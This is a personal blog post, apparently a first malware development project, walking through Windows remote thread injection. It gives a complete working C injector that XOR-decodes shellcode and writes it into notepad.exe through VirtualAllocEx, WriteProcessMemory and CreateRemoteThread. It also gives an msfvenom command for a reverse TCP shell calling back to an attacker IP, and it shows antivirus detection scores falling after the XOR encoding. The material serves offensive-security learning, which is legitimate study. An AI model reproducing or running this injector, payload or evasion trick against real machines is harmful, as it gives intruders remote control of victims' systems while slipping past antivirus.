---
title: "First malware : Windows Remote Thread Injection"
date: 2024-10-07
description: "Basic method to inject shellcode into a remote process"
---

---
# What ?? Malware ?? No more pentesting ?? (Boring backstory)

Well, kind of (yes). I'll keep this brief. I started my cybersecurity journey back in 2020 with penetration testing, web application security, and participating in various Capture the Flag (CTF) challenges, mainly on HackTheBox. After a while, though, I found myself getting a bit bored. I was running out of ideas, and working on box after box made me realize it was time to explore something new and exciting.

That brings me to this new chapter in my career: Malware Development.

To be honest, I've always disliked programming (probably because I wasn't great at it, lol), but malware development has always fascinated me. So, I decided to give it a try and see where it takes me—whether I excel or fail, it’ll be a learning experience.

This project wouldn't have been possible without the support of two friends (hi jord & bakki <3), so all the credit goes to them.
From here on out, expect to see more malware development content, along with anything related to the amazing OS that is Windows.
Without further ado, let’s dive into the topic of this blog post.

--- 
# Fundamental of Process Injection 

Before anything else let's define the term we're going to focus on here, and MITRE has done a fantastic job for that so I'll quote them : 

*Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges* from [MITRE](https://attack.mitre.org/techniques/T1055/)

--- 
# Brief description of the project 

As stated in the introduction, this project came to life thanks to a friend of mine as I've asked him if he had some ideas about a baby project I could do to get my feet wet with Malware Development.  

As shown below, this is what he came up with : 

![targets](/images/idea.png)  
Everything is already perfectly explained (thanks again <3) but the goal here is to write a small program that will execute a shellcode (a payload designed to execute code on a target host) into a remote process which will return a reverse shell on my local machine.   
To accomplish this, we are going to use the C programming language.  

We will talk a bit about this later but the shellcode will be encrypted using *Single-byte XOR encryption* which is a very basic AV evasion method. 

--- 
# OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread APIs 

Before diving into the code, let's talk a bit about the four functions we're going to use in this program.  

## OpenProcess

The **OpenProcess** function is used to open an existing process (using its PID for example) for manipulation or observation by another process. The parameters it's taking are : 

| Name            | Description                                                                                                                                           |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| dwDesiredAccess | Specifies the access rights that are requested for the process (read, write, synchronize, ...). (We will use PROCESS_ALL_ACCESS)                                                      |
| bInheritHandle  | Determines whether the new process handle can be inherited by child processes. If set to TRUE, the handle is inheritable; if set to FALSE, it is not. |
| dwProcessId     | Specifies the unique identifier (PID) of the target process that we want to open.                                                                     | 

## VirtualAllocEx

**VirtualAllocEx** function is used to reserve, commit, or free a region of memory within the virtual address space of a specified process.  
We will use this function to allocate memory for our shellcode.  
(Note:  Here, *Ex* stands for **Extended**, which is an extended version of VirtualAlloc)

| Name             | Description                                                                                                                                               |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| hProcess         | Specifies a handle to the process in which the memory allocation is to occur.                                                                             |
| lpAddress        | Specifies the starting address of the region to allocate. If this parameter is set to NULL, the system determines by itself where to allocate the region. |
| dwSize           | Specifies the size, in bytes, of the region to allocate. If lpAddress isn't set to NULL, this parameter must be zero.                                     |
| flAllocationType | Specifies the type of memory allocation (MEM_COMMIT, MEM_RESERVE, or MEM_RESET).                                                                         |
| flProtect        | Specifies the memory protection for the region (PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE, ...).                                                        | 

For the **dwSize** parameter, we will specify the size of our shellcode, because that is exactly the size we want to allocate (**sizeof** directive in C).   

## WriteProcessMemory 

**WriteProcessMemory** allows a process to write data to a specified region of memory in a target process.

| Name                   | Description                                                                                       |
| ---------------------- | ------------------------------------------------------------------------------------------------- |
| hProcess               | Same as above                                                                                     |
| lpBaseAddress          | Specifies the starting address of the region of memory to write to in the target process.         |
| lpBuffer               | Represents a pointer to the buffer that contains the data to be written to the specified process. |
| nSize                  | Number of bytes to write from the buffer.                                                         |
| lpNumberOfBytesWritten | Pointer to a variable that receives the number of bytes actually written (optional).              | 

In our case, **lpBuffer** will be a pointer to our shellcode, with a **nSize** also equal to our shellcode (also using **sizeof**).  
Since we don't need **lpNumberOfBytesWritten**, this will be set to *NULL*. 

## CreateRemoteThread 

This is where the magic happens since it's the link between our shellcode and the target process.  
To put it simply ; It will create a thread in the virtual address place of our process, which will allow us to execute code on the system (thanks to the reverse shell mentioned at the beginning). 

| Name               | Description                                                                                                                     |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------- |
| hProcess           | Same as above                                                                                                                   |
| lpThreadAttributes | Allows to specify security attributes for the new thread (we won't use that so it will be set to NULL).                         |
| dwStackSize        | Specifies the initial size of the stack (in bytes) for the new thread. If set to 0, the system will use the default stack size. |
| lpStartAddress     | Pointer that specifies where the new thread will start.                                                                         |
| lpParameter        | Pointer to a variable that will be passed to the thread function specified in lpStartAddress.                                   |
| dwCreationFlags    | Provides additional options for thread creation.                                                                                | 
| lpThreadId         | Pointer to a variable that will receive the thread identifier of the newly created thread.                                      |

In our case, **lpThreadAttributes** **lpParameter** and **lpThreadId** will be set to NULL because we don't need that.  
For **lpStartAddress** we will use **LPTHREAD_START_ROUTINE** which indicates the beginning of our shellcode.  

--- 

# Proof of Concept 

## 1. Opening a handle to our process 

```c
    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        2468
);
```

First, we create our handle to our process, here I chose *notepad.exe* denoted by a PID of 2468, you can choose anything you want (a cmd, another random application, ...). 
**PROCESS_ALL_ACCESS** gives all possible access rights to our object.  

## 2. Basic AV Evasion (more on this later)

```c
char key = 'S';

for (int i = 0; i < sizeof(shellcode); i++)
    {
		shellcode[i] ^= key;
    }
```
We will use a very basic antivirus evasion method here ; encrypting our shellcode using XOR.

## 3. Memory allocation for our shellcode

```c
    LPVOID lpShellcode = VirtualAllocEx(
        hProc,
        0,
        sizeof shellcode,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE // Our RWX permissions
    );
```
We specify our handle *hProc* defined at the very start of our program, with a memory size of our shellcode.  
Because we want read, write and execute permission we will use the **PAGE_EXECUTE_READWRITE** directive.  
**LPVOID** is simply a windows pointer to any type (https://learn.microsoft.com/fr-fr/windows/win32/winprog/windows-data-types). 

## 4. Writing the shellcode to the process memory 

```c
    WriteProcessMemory(
        hProc,
        lpShellcode,
        shellcode,
        sizeof shellcode,
        NULL
);
```
Not much to say here, the starting address will be the one of our shellcode (using a pointer), with again a size corresponding to the same shellcode.  
**lpNumberOfBytesWritten** is set to NULL because we don't need any additional pointer to write received data to (since we know everything will be written).

## 5. Remote thread creation 

```c
    HANDLE hRemoteThread = CreateRemoteThread(
        hProc,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)lpShellcode, // This defines the start of our shellcode
        NULL,
        0, // 0 = will run directly after creation
        NULL
);

// thanks jordge for this <3

    WaitForSingleObject(hRemoteThread, INFINITE);
    return 0;
```
As stated above, **LPTHREAD_START_ROUTINE** will allow us to define the start of our shellcode.  
Here, **dwCreationFlags** set to 0 indicates that our thread will be run directly after creation, granting us with our future beautiful shell. 

I didn't talk about it earlier but **WaitForSingleObject** set to INFINITE means that the process will run indefinitely until we close it ourself.  

The final PoC (with comments removed) is shown below : 

```c
#include <windows.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include "shellcode.h"

int main(int argc, char *argv[])
{
    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        2468);

char key = 'S';

for (int i = 0; i < sizeof(shellcode); i++)
    {
        shellcode[i] ^= key;
    }

    LPVOID lpShellcode = VirtualAllocEx(
        hProc,
        0,
        sizeof shellcode,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE // Our RWX permissions
    );

    WriteProcessMemory(
        hProc,
        lpShellcode,
        shellcode,
        sizeof shellcode,
        NULL);

    HANDLE hRemoteThread = CreateRemoteThread(
        hProc,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)lpShellcode, // This defines the start of our shellcode
        NULL,
        0, // 0 = will run directly after creation
        NULL);

		    WaitForSingleObject(hRemoteThread, INFINITE);
			return 0;
}
```

--- 

# Execution of the shellcode -> shell on host 

Now that we have successfully built our exploit, let's execute it on our host (Windows) machine to catch a shell on our attacker (Kali Linux) machine.  
Before that, we will generate a basic msfvenom shellcode with the following command : 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.244.137 LPORT=443 -f c
# LHOST : Attacker IP 
# LPORT : Local port, here 443 
```

We will then get our shellcode (bytes-formatted) put in a separate header file (**shellcode.h**), so that the main code stays clean. 
Now, all we have to do is to setup a basic netcat listener and execute our compiled program (main.exe) on our victim machine.  
If everything went right (spoiler : it did) we will have a callback on the said listener, giving us a shell from the same victim machine !! 

![targets](/images/injected.png)

As we can see, ProcessHacker noticed the network connection that just happened, showing that we successfully injected the remote process to get our reverse shell ! 

--- 

# AV Evasion : Single-byte XOR Encryption

Now let's talk a little about this piece of code : 

```c
char key = 'S';

for (int i = 0; i < sizeof(shellcode); i++)
    {
		shellcode[i] ^= key;
    }
```

Single-byte XOR encryption is a simple encryption method where each byte of the plaintext is XORed with a single key value (in this case, the letter 'S'). The same key is applied to every byte in the plaintext, meaning decryption is simply performed by XORing the ciphertext with the same key.

When used on shellcode, single-byte XOR encryption can obfuscate its contents, making it harder for static analysis tools or antivirus software to detect malicious code. The shellcode is then decrypted at runtime before execution.

As a demonstration, I uploaded my malicious program to VirusTotal (this is acceptable in this case because the program is kept very simple; otherwise, avoid doing this as it will publicly flag your signature).
Here is a before & after encryption : 

![targets](/images/vtbefore.png)
![targets](/images/vtafter.png)

The difference is not that big but as we can see we lowered our score by 5, demonstrating clearly that even a very basic and well-known evasion method works. 

--- 
# Conclusion  

I aimed to demonstrate a simple yet powerful program that enabled us to achieve code execution on a target machine. I wrote this code in about 30 minutes while relearning C from scratch, since I had forgotten most of what I knew about this lovely language. So, please don't judge too harshly if my code has made you want to give up programming for good.

I hope you enjoyed following along as much as I enjoyed creating this. I'm excited to dive into even more fun projects in the wonderful piece of software that is Windows.  

See you soon, and take care !

---

# Sources 

- Windows API Index : https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list
- Jordan Jay blog : https://www.legacyy.xyz/
- Zero2Hero: Red Team Tradecraft by Jordan Jay : https://www.youtube.com/watch?v=LIMw4JZohNo
- CreateRemoteThread Shellcode Injection by ired.team : https://www.ired.team/offensive-security/code-injection-process-injection/process-injection

